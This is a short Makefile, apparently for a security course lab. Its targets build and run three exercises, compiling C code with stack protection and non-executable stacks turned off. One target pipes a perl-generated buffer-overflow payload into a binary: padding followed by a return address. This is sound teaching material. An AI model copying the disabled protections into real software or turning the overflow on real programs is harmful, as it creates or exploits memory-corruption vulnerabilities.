que1:
	echo Hello World! > test.txt
	nasm -f elf64 que1.asm
	ld que1.o -o que1
	./que1

que2:
	gcc -g -Wall -fno-stack-protector -z execstack que2.c -o que2
	./que2

que3:
	gcc -fno-stack-protector -zexecstack -o que3 que3.c
	perl -e '(print"0"x24).(print "\xf4\x06\x40\x00")' | ./que3

clean1:
	rm test.txt
	rm que1.o
	rm ./que1

clean2:
	rm ./que2

clean3:
	rm ./que3
